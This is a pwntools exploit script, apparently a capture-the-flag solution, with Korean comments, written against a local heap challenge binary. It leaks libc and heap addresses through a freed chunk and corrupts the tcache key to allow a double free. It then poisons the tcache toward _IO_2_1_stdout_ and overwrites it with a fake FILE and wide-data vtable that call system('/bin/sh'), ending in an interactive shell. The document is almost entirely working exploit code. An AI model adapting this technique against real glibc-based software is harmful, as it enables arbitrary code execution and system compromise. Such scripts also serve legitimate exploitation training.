from pwn import *

p = process('./chal')
libc = ELF('./libc.so.6')
context.log_level='debug'

def protect(pos, ptr):
    return (pos >> 12) ^ ptr

def allocate(idx, size, data):
    p.sendlineafter(b"> ", b"1")
    p.sendlineafter(b"idx?: ", str(idx).encode())
    p.sendlineafter(b"size?: ", str(size).encode())
    p.sendlineafter(b"data?: ", data)
def view(idx):
    p.sendlineafter(b"> ", b"2")
    p.sendlineafter(b"idx?: ", str(idx).encode())
    p.recvuntil(b"meow: ")
    leak_data = p.recvuntil(b"1. ")[:-3]
    if len(leak_data) > 8:
        leak_data = leak_data[:8]
    return u64(leak_data.ljust(8, b"\x00"))
def dele(idx): 
    p.sendlineafter(b"> ", b"3")
    p.sendlineafter(b"idx?: ", str(idx).encode())

def edit(idx, data): 
    p.sendlineafter(b"> ", b"4")
    p.sendlineafter(b"idx?: ", str(idx).encode())
    p.sendlineafter(b"new data?: ", data)

allocate(0, 0x500, b"A")
allocate(1, 0x200, b"B")
dele(0)
dele(1)
libc_val = view(0)
heap_val = view(1)
log.info(f"Unsorted Bin Leak: {hex(libc_val)}")

offset = 0x7ffff7fafb20 - 0x7ffff7d9e000
libc_base = libc_val - offset
heap_base = heap_val << 12
log.info(f"Libc Base: {hex(libc_base)}")
log.info(f"Heap Base: {hex(heap_base)}")

log.info("=== Double Free for Count Manipulation ===")

stdout_addr = libc.symbols['_IO_2_1_stdout_']

# 1. Key Corruption (Use sendline to send 8 bytes payload + \n)
#    Chunk 1의 Key(offset 8)의 첫 바이트가 '\n'으로 덮어써짐 -> Double Free 가능해짐
#    Payload 내용은 중요하지 않음 (나중에 다시 쓸 것임), 8바이트 맞춰주기
dummy_payload = b"X"*8 
edit(1, dummy_payload) 

# 2. Double Free (Count=2)
dele(1) 

# 3. Alloc 1 (Pop C1) -> Write stdout ptr
#    C1을 다시 할당받으면서 fd에 encoded_stdout을 씀
#    Bin: C1 -> stdout. Count=1.
payload = p64(protect(heap_base, stdout_addr))
allocate(1, 0x200, payload)

# 4. Alloc 1 (Pop C1 again) -> Consume Junk
#    Bin: stdout. Count=0.
allocate(1, 0x200, b"JUNK")

# 5. Alloc 0 (Pop stdout) -> Trigger!
#    Count=0이어도 위에서 pop을 했기 때문에 내부 상태가 꼬여서 나올 수도 있으나
#    원칙적으로는 Count가 부족함. Double Free로 Count=2를 만들었으니 성공해야 함.

# FSOP Payload
stdout_lock = libc_base + 0x21ba80
wfile_jumps = libc_base + 0x2160c0
system_addr = libc.symbols['system']

fake_stdout = b"  /bin/sh\0"
fake_stdout = fake_stdout.ljust(0x88, b"\x00")
fake_stdout += p64(stdout_lock)
fake_stdout = fake_stdout.ljust(0xa0, b"\x00")
fake_stdout += p64(stdout_addr + 0x100)
fake_stdout = fake_stdout.ljust(0xc0, b"\x00")
fake_stdout += p64(1)
fake_stdout = fake_stdout.ljust(0xd8, b"\x00")
fake_stdout += p64(wfile_jumps)

fake_wide = b"\x00" * 0xe0 
fake_wide += p64(stdout_addr + 0x200) 

fake_vtable = b"\x00" * 0x68
fake_vtable += p64(system_addr)

final_payload = fake_stdout.ljust(0x100, b"\x00") + fake_wide.ljust(0x100, b"\x00") + fake_vtable

# Trigger
allocate(0, 0x200, final_payload)

p.interactive()

